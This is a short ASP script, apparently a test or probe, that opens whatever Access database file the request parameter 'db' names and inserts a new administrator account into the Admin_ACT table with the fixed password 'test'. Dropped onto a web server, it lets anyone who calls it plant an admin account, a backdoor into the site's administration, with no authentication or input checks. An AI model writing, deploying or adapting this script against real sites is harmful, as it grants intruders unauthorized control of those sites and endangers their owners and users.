<%
Dim connection, recordset
Set connection = Server.CreateObject("ADODB.Connection")
connection.Open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Request("db")
Set recordset = Server.CreateObject("ADODB.Recordset")
recordset.Open "SELECT * FROM Admin_ACT", connection, 1, 3
recordset.AddNew
recordset("Admin_Name") = "mdb-addnew-test"
recordset("PassWord") = "test"
recordset("Locked") = 0
recordset("SuperTF") = 0
recordset.Update
Response.Write recordset("Admin_Name")
%>
